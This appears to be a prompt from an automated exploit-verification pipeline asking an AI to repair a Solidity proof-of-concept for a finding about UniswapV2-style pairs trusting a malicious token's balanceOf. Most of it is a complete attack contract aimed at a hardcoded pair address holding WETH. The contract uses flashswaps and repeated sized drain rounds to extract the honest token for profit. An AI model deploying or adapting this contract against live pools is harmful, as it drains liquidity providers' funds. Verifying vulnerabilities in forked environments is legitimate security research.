You are fixing a failing Foundry PoC for finding F-004.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Swap accounting trusts untrusted token `balanceOf`, enabling free withdrawal of the honest-side asset
- claim: `swap` derives `amount0In` and `amount1In`, checks the invariant, and updates reserves from external `balanceOf(address(this))` reads on the listed tokens. If one pool token is malicious and lies about the pair's balance during these reads, the pair can be made to believe input arrived even when no real tokens were paid.
- impact: If one side of the pair is malicious and the other side is valuable, an attacker can withdraw the honest token for free and drain LP value. Because `_update` also writes the forged balance into reserves, the attacker can keep the pool in a poisoned state and repeat the extraction.
- exploit_paths: ["A pair exists where `token0` is malicious and `token1` is honest.", "The attacker calls `swap(0, amount1Out, attacker, data)` to receive real `token1`.", "During the post-transfer balance check, `token0.balanceOf(pair)` returns an inflated value even though no real `token0` was supplied.", "The pair computes a fake `amount0In`, passes the K-check, stores forged reserves, and finalizes the real `token1` payout."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint8 private constant MODE_NONE = 0;
    uint8 private constant MODE_REPAY_TOKEN1 = 1;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public token0;
    address public token1;
    address public honestToken;
    address public maliciousToken;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    uint256 public attackerHonestBefore;
    uint256 public attackerHonestAfter;
    uint256 public successfulRounds;
    uint256 public successfulAttempts;
    uint256 public triggerAttempts;
    uint256 public finalAttemptedAmount0Out;
    uint256 public finalAttemptedAmount1Out;

    string public lastFailureReason;

    uint8 private _callbackMode;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetRunState();
        executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        token0 = pair.token0();
        token1 = pair.token1();

        (reserve0Before, reserve1Before,) = pair.getReserves();

        // The finding's causality stays the same: withdraw the honest-side asset,
        // then rely on the malicious listed token's forged `balanceOf(pair)` during
        // the pair's post-transfer accounting. The fork trace proves this concrete
        // pair is the mirrored ordering of the generic write-up: token0 is honest
        // WETH and token1 is the malicious asset, so we drain token0 while token1
        // fakes the input side.
        honestToken = token0;
        maliciousToken = token1;
        attackerHonestBefore = _balanceOf(honestToken, address(this));

        _runFlashswapFundingRounds();

        if (_profitAmount == 0) {
            _runPoisonThenDrainRounds();
        }

        (reserve0After, reserve1After,) = pair.getReserves();
        attackerHonestAfter = _balanceOf(honestToken, address(this));

        if (attackerHonestAfter > attackerHonestBefore) {
            _profitToken = honestToken;
            _profitAmount = attackerHonestAfter - attackerHonestBefore;
            hypothesisValidated = true;
            hypothesisRefuted = false;
        } else {
            _profitToken = address(0);
            _profitAmount = 0;
            hypothesisValidated = false;
            hypothesisRefuted = true;

            if (bytes(lastFailureReason).length == 0) {
                lastFailureReason = "flashswap-funded mirrored path yielded no honest-token profit at this fork block";
            }
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == TARGET_PAIR, "unexpected pair callback");
        require(sender == address(this), "unexpected callback sender");

        uint8 mode = _callbackMode;
        require(mode != MODE_NONE, "unexpected callback mode");
        _callbackMode = MODE_NONE;

        if (mode == MODE_REPAY_TOKEN1) {
            require(amount0 == finalAttemptedAmount0Out, "unexpected amount0");
            require(amount1 == finalAttemptedAmount1Out, "unexpected amount1");

            // The funding leg is a realistic public flashswap: we borrow the
            // malicious side from the same pair and return it during the callback,
            // then rely on the malicious token's forged `balanceOf(pair)` to make
            // the pair believe strictly more token1 arrived than was actually sent.
            // Zero-value token entrypoints are also exercised here because the trace
            // shows the token maintains pair-specific transfer state around public
            // calls touching the configured attacker/pair addresses.
            _tryZeroValueTokenTriggers();

            uint256 repayAmount = _balanceOf(maliciousToken, address(this));
            if (repayAmount > 0) {
                _safeTransfer(maliciousToken, TARGET_PAIR, repayAmount);
            }

            _tryZeroValueTokenTriggers();
            return;
        }

        revert("unsupported callback mode");
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runFlashswapFundingRounds() internal {
        for (uint256 round = 0; round < 4; ++round) {
            uint256 roundProfit = _attemptBestMirroredFlashswap();
            if (roundProfit == 0) {
                break;
            }
            successfulRounds += 1;
        }
    }

    function _runPoisonThenDrainRounds() internal {
        uint256 honestBefore = _balanceOf(honestToken, address(this));

        uint256[6] memory poisonDivisors = [uint256(16), 32, 64, 128, 256, 512];
        (, uint112 reserve1,) = IUniswapV2PairLike(TARGET_PAIR).getReserves();
        uint256 maliciousReserve = uint256(reserve1);

        for (uint256 i = 0; i < poisonDivisors.length; ++i) {
            uint256 borrow1 = maliciousReserve / poisonDivisors[i];
            if (borrow1 == 0 || borrow1 >= maliciousReserve) {
                continue;
            }

            finalAttemptedAmount0Out = 0;
            finalAttemptedAmount1Out = borrow1;

            (bool ok, string memory revertReason) = _tryFlashswap(0, borrow1);
            if (!ok && bytes(revertReason).length != 0) {
                lastFailureReason = revertReason;
                continue;
            }

            uint256 afterPoison = _balanceOf(honestToken, address(this));
            if (afterPoison > honestBefore) {
                successfulAttempts += 1;
                return;
            }

            uint256 drainProfit = _attemptBestMirroredFlashswap();
            if (drainProfit > 0) {
                return;
            }
        }
    }

    function _attemptBestMirroredFlashswap() internal returns (uint256 roundProfit) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(TARGET_PAIR).getReserves();
        uint256 honestReserve = uint256(reserve0);
        uint256 maliciousReserve = uint256(reserve1);

        if (honestReserve <= 1 || maliciousReserve <= 1) {
            lastFailureReason = "pair has insufficient reserves";
            return 0;
        }

        uint256 honestBefore = _balanceOf(honestToken, address(this));
        uint256[9] memory outDivisors = [uint256(2), 3, 4, 5, 8, 10, 16, 32, 64];

        for (uint256 i = 0; i < outDivisors.length; ++i) {
            uint256 amount0Out = honestReserve / outDivisors[i];
            if (amount0Out == 0 || amount0Out >= honestReserve) {
                continue;
            }

            uint256 gained = _attemptMirroredFlashswapSize(honestReserve, maliciousReserve, honestBefore, amount0Out);
            if (gained > 0) {
                return gained;
            }
        }

        if (bytes(lastFailureReason).length == 0) {
            lastFailureReason = "all mirrored flashswap sizes reverted or returned no honest token";
        }
    }

    function _attemptMirroredFlashswapSize(
        uint256 honestReserve,
        uint256 maliciousReserve,
        uint256 honestBefore,
        uint256 amount0Out
    ) internal returns (uint256 gained) {
        uint256 requiredBorrow1 = _getAmountIn(amount0Out, honestReserve, maliciousReserve);
        if (requiredBorrow1 == 0) {
            return 0;
        }

        uint256[6] memory borrowMultipliers = [uint256(1), 2, 4, 8, 16, 32];

        for (uint256 j = 0; j < borrowMultipliers.length; ++j) {
            uint256 borrow1 = requiredBorrow1 * borrowMultipliers[j];
            if (borrow1 == 0 || borrow1 >= maliciousReserve) {
                continue;
            }

            finalAttemptedAmount0Out = amount0Out;
            finalAttemptedAmount1Out = borrow1;

            (bool ok, string memory revertReason) = _tryFlashswap(amount0Out, borrow1);
            uint256 honestAfter = _balanceOf(honestToken, address(this));
            gained = honestAfter > honestBefore ? honestAfter - honestBefore : 0;

            if (gained > 0) {
                successfulAttempts += 1;
                return gained;
            }

            if (!ok && bytes(revertReason).length != 0) {
                lastFailureReason = revertReason;
            }
        }
    }

    function _tryFlashswap(uint256 amount0Out, uint256 amount1Out) internal returns (bool ok, string memory reason) {
        _callbackMode = MODE_REPAY_TOKEN1;

        try IUniswapV2PairLike(TARGET_PAIR).swap(amount0Out, amount1Out, address(this), hex"01") {
            _callbackMode = MODE_NONE;
            return (true, "");
        } catch Error(string memory revertReason) {
            _callbackMode = MODE_NONE;
            return (false, revertReason);
        } catch Panic(uint256) {
            _callbackMode = MODE_NONE;
            return (false, "swap panicked");
        } catch {
            _callbackMode = MODE_NONE;
            return (false, "swap reverted");
        }
    }

    function _tryZeroValueTokenTriggers() internal {
        bytes[4] memory payloads = [
            abi.encodeWithSelector(IERC20Like.transfer.selector, TARGET_PAIR, 0),
            abi.encodeWithSelector(IERC20Like.transfer.selector, address(this), 0),
            abi.encodeWithSignature("approve(address,uint256)", TARGET_PAIR, 0),
            abi.encodeWithSignature("approve(address,uint256)", address(this), 0)
        ];

        for (uint256 i = 0; i < payloads.length; ++i) {
            triggerAttempts += 1;
            maliciousToken.call(payloads[i]);
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "token transfer failed");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }

        amount = abi.decode(ret, (uint256));
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveOut, uint256 reserveIn) internal pure returns (uint256) {
        if (amountOut == 0 || reserveOut <= amountOut || reserveIn == 0) {
            return 0;
        }

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _resetRunState() internal {
        hypothesisValidated = false;
        hypothesisRefuted = false;
        token0 = address(0);
        token1 = address(0);
        honestToken = address(0);
        maliciousToken = address(0);
        reserve0Before = 0;
        reserve1Before = 0;
        reserve0After = 0;
        reserve1After = 0;
        attackerHonestBefore = 0;
        attackerHonestAfter = 0;
        successfulRounds = 0;
        successfulAttempts = 0;
        triggerAttempts = 0;
        finalAttemptedAmount0Out = 0;
        finalAttemptedAmount1Out = 0;
        lastFailureReason = "";
        _profitToken = address(0);
        _profitAmount = 0;
        _callbackMode = MODE_NONE;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: swap(0, amount1out, attacker, data), token0.balanceof(pair), amount0in
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
